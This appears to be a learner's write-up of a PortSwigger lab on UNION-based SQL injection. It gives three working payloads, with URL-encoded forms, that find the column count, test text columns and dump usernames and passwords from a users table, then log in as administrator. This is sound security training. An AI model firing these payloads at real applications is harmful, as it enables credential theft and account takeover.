# PortSwigger Web Security Academy

## Lab: SQL Injection UNION Attack – Retrieving Data from Other Tables

**Date:** 25 September 2026
**Platform:** PortSwigger Web Security Academy
**Category:** SQL Injection

---

## 1. Lab Overview

This lab demonstrates how a **SQL Injection UNION attack** can be used to retrieve data from another database table.

The vulnerable parameter was the product category filter.

The lab description informed us that the database contained another table called:

```text
users
```

with the following columns:

```text
username
password
```

The objective was to:

1. Identify the number of columns returned by the original SQL query.
2. Identify which columns accept text.
3. Use a `UNION SELECT` attack to retrieve data from the `users` table.
4. Find the `administrator` user's password.
5. Log in as the administrator and solve the lab.

---

# 2. Tools Used

* Burp Suite
* Web browser
* PortSwigger Web Security Academy
* Burp Repeater

---

# 3. Understanding the UNION Attack

The SQL `UNION` operator allows the results of two `SELECT` queries to be combined.

For example:

```sql
SELECT column1, column2 FROM table1
UNION
SELECT column1, column2 FROM table2
```

For a UNION attack to work, the two queries generally need to return the same number of columns.

The data types of the corresponding columns also need to be compatible.

Therefore, before retrieving useful information, we first needed to determine:

* How many columns the original query returned.
* Which columns could contain text.

---

# 4. Identifying the Vulnerable Parameter

The vulnerable functionality was the product category filter.

A normal request looked similar to:

```http
GET /filter?category=Gifts HTTP/2
Host: <LAB-ID>.web-security-academy.net
```

The important parameter was:

```text
category
```

This parameter was vulnerable to SQL injection.

---

# 5. Intercepting the Request with Burp Suite

I opened the lab and selected a product category.

Burp Suite was configured to intercept the request.

The request was then sent to:

```text
Burp Suite → Repeater
```

Repeater allowed me to modify the `category` parameter and repeatedly test different SQL injection payloads.

---

# 6. Finding the Number of Columns

The first step was to determine how many columns the original SQL query returned.

I started by testing:

```sql
' UNION SELECT NULL--
```

This was not sufficient.

I then tested:

```sql
' UNION SELECT NULL,NULL--
```

The request successfully returned a normal HTTP response.

This confirmed that the query contained **two columns**.

### Result

```text
Number of columns = 2
```

This was important because our eventual `UNION SELECT` statement also needed to return two columns.

---

# 7. Determining Which Columns Accept Text

Knowing that there were two columns was not enough.

The next step was to determine whether the columns could accept text values.

I used:

```sql
' UNION SELECT 'abc','def'--
```

The URL-encoded version used in the request was:

```text
'+UNION+SELECT+'abc','def'--
```

The application returned:

```text
abc    def
```

The response contained:

```html
<th>abc</th>
<td>def</td>
```

This confirmed that both columns accepted text.

### Result

```text
Column 1 → Text compatible
Column 2 → Text compatible
```

Therefore, the following type of query should work:

```sql
UNION SELECT <text>, <text>
```

---

# 8. Understanding the `users` Table

The lab description explicitly stated that the database contained a table named:

```text
users
```

with two columns:

```text
username
password
```

Therefore, we could construct a UNION query using those columns.

We now had all the information needed:

```text
Number of columns: 2

Column 1: accepts text
Column 2: accepts text

Table: users

Columns:
username
password
```

---

# 9. Retrieving the Users Table

I used the following SQL injection payload:

```sql
' UNION SELECT username,password FROM users--
```

The URL-encoded version was:

```text
'+UNION+SELECT+username,password+FROM+users--
```

The important parts of the payload are:

### `'`

Closes the original string value in the SQL query.

### `UNION SELECT`

Combines the original query with our injected query.

### `username,password`

Specifies the two columns we wanted to retrieve.

### `FROM users`

Tells the database to retrieve those values from the `users` table.

### `--`

Comments out the remainder of the original SQL statement.

---

# 10. Retrieved Credentials

The server returned the contents of the `users` table.

The response contained:

```text
carlos          <LAB_PASSWORD>
administrator   <LAB_PASSWORD>
wiener          <LAB_PASSWORD>
```

The administrator credentials were then used to authenticate to the application.

> **Note:** Actual credentials should not be committed to a public GitHub repository. Use placeholders in public documentation.

For example:

```text
Username: administrator
Password: <REDACTED>
```

---

# 11. Logging in as Administrator

I navigated to the application's login page:

```text
/my-account
```

I entered:

```text
Username: administrator
Password: <REDACTED>
```

After submitting the credentials, the application authenticated me as the administrator.

The PortSwigger lab displayed:

```text
LAB SOLVED
```

---

# 12. Attack Flow

The complete attack can be summarized as:

```text
Product Category Filter
        ↓
Identify SQL Injection
        ↓
Determine Number of Columns
        ↓
' UNION SELECT NULL,NULL--
        ↓
2 Columns Confirmed
        ↓
Determine Text-Compatible Columns
        ↓
' UNION SELECT 'abc','def'--
        ↓
Both Columns Accept Text
        ↓
Read users Table
        ↓
' UNION SELECT username,password FROM users--
        ↓
Retrieve Usernames & Passwords
        ↓
Find administrator Credentials
        ↓
Login as administrator
        ↓
LAB SOLVED
```

---

# 13. Payloads Used

### Payload 1 – Column count

```sql
' UNION SELECT NULL,NULL--
```

**Purpose:** Determine whether the original query returns two columns.

---

### Payload 2 – Text compatibility

```sql
' UNION SELECT 'abc','def'--
```

**Purpose:** Determine whether both columns can contain text.

---

### Payload 3 – Retrieve users

```sql
' UNION SELECT username,password FROM users--
```

**Purpose:** Retrieve usernames and passwords from the `users` table.

---

# 14. What I Learned

From this lab, I learned how a UNION-based SQL injection can be used to retrieve information from a different database table.

The important process was not simply knowing the final payload. I first had to understand the structure of the original query.

The attack required three main stages:

1. **Determine the number of columns.**
2. **Determine which columns accept the required data type.**
3. **Use those columns to retrieve information from another table.**

I also learned how the following SQL concepts work together during a SQL injection attack:

```text
UNION
SELECT
FROM
--
```

---

# 15. Key Takeaways

* UNION attacks require compatible column counts.
* `NULL` is useful when testing the number of columns because it can generally be used with different data types.
* Text values can be used to identify columns that support string data.
* Information from another table can potentially be exposed when a UNION-based SQL injection is present.
* SQL injection can become significantly more serious when sensitive database tables are accessible.
* Burp Suite Repeater makes it easier to test and compare SQL injection payloads.
* Understanding the underlying SQL query is more important than blindly using payloads.

---

